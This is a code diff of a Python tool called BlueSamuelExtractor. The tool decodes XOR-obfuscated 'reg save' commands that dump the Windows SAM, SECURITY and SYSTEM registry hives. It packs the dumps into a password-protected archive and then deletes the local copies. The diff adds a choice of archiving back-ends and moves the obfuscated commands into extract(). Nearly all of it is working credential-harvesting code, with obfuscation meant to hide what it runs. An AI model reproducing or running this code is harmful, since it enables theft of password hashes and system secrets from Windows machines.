@@ -1,12 +1,12 @@
 import subprocess
-import pyzipper
 import sys
+from enum import Enum
+from pathlib import Path
 
-# The obfuscation is basic bitwise operation with the actual index+2
-
-# The obfuscated commands
-command_array_creation=["pge\"qctg\"JINO^Q[QVGO\"Q[QVGO,jkt", "qfd#pbuf#KHON_PF@VQJWZ#PF@VQJWZ-kju", "vac$wera$LOHIXWEI$WEI*lmr"]
-command_array_removal=["del SYSTEM.HIV", "del SECURITY.HIV", "del SAM.HIV"]
+class ArchiveTypes(Enum):
+    pyzipper = "0"
+    szip = "1"
+    pyminizip = "2"
 
 class SAMuel:
     def set_password(self,password):
@@ -23,23 +23,79 @@ class SAMuel:
         return self.archive_name
 
 def extract():
+    # The obfuscation is basic bitwise operation with the actual index+2
+    command_array_creation=["pge\"qctg\"JINO^Q[QVGO\"Q[QVGO,jkt", "qfd#pbuf#KHON_PF@VQJWZ#PF@VQJWZ-kju", "vac$wera$LOHIXWEI$WEI*lmr"]
+
     for index in range (0,len(command_array_creation),1):
         
         # Deobfuscate the command
         command = ''.join(chr(ord(c) ^ index+2) for c in command_array_creation[index])
-        print(command)
         # Execute the command
         result = subprocess.run(command, shell=True, capture_output=True, text=True)
 
-def archive(samuel_instane):
+def archive_pyminizip(samuel_instane, files):
+    import pyminizip
+
+    pyminizip.compress_multiple(files, [], samuel_instane.get_archive_name(), samuel_instane.get_password().encode("utf-8"), 9)
+
+
+def archive_szip(samuel_instane, files):
+    szip_path = Path(r"C:\Program Files\7-Zip\7z.exe")
+
+    cmd = [
+        szip_path, # Path of the 7z.exe
+        "a", # indicate the create an archive
+        samuel_instane.get_archive_name(), # name of the archive file
+        *files, # path of the archivated file
+        "-p"+samuel_instane.get_password(), # password
+        "-mem=AES256" # used encryption
+        ]
+
+    subprocess.run(cmd, check=True)
+
+
+def archive_pyzipper(samuel_instane, files):
+    import pyzipper
+
     # Create a password protected archive file
     with pyzipper.AESZipFile(samuel_instane.get_archive_name(),'w',compression=pyzipper.ZIP_DEFLATED,encryption=pyzipper.WZ_AES) as zf:
         zf.setpassword(samuel_instane.get_password().encode("utf-8"))
-        zf.write('SYSTEM.HIV')
-        zf.write('SECURITY.HIV')
-        zf.write('SAM.HIV')
+        for index in range (0,len(files),1):
+            zf.write(files[index])
+
+def archive(samuel_instane):
+    files=["SYSTEM.HIV","SECURITY.HIV","SAM.HIV"]
+
+    error_occured = False
+    for index in range (0,len(files)-1,1):
+        file_path = Path(files[index])
+        if not file_path.exists():
+            error_occured = True
+
+    if(not error_occured):
+        match samuel_instane.get_archive_type():
+            case ArchiveTypes.pyzipper.value:
+
+                archive_pyzipper(samuel_instane, files)
+
+            case ArchiveTypes.szip.value:
+
+                archive_szip(samuel_instane, files)
+                
+
+            case ArchiveTypes.pyminizip.value:
+                
+                archive_pyminizip(samuel_instane, files)
+
+            case _:
+                print("ERROR")
+    else:
+        sys.exit("Some of the registry wasn't dumped!")
 
 def removal():
+    # The obfuscated commands
+    command_array_removal=["del SYSTEM.HIV", "del SECURITY.HIV", "del SAM.HIV"]
+
     # Remove the registry imports
     for index in range (0,len(command_array_removal),1):
         
@@ -49,7 +105,10 @@ def removal():
 def help():
     print("Usage of the BlueSamuelExtractor.py")
     print("-----------------------------------")
-    print("BlueSamuelExtractor.py [ARCHIVE TYPE] [ARCHIVE NAME] [PASSWORD]")
+    print("BlueSamuelExtractor.py [ARCHIVE TYPE] [ARCHIVE NAME]")
+    print("Supported archivating methods: pyzipper: 0, 7ip: 1, pyminizip: 2 | default: 0")
+    print("--random_tmp_file_naming [0/1] | default:0")
+    print("--password_archive_enable [0/1] [PASSWORD] | default:0")
     print("-----------------------------------")
 
 def main():
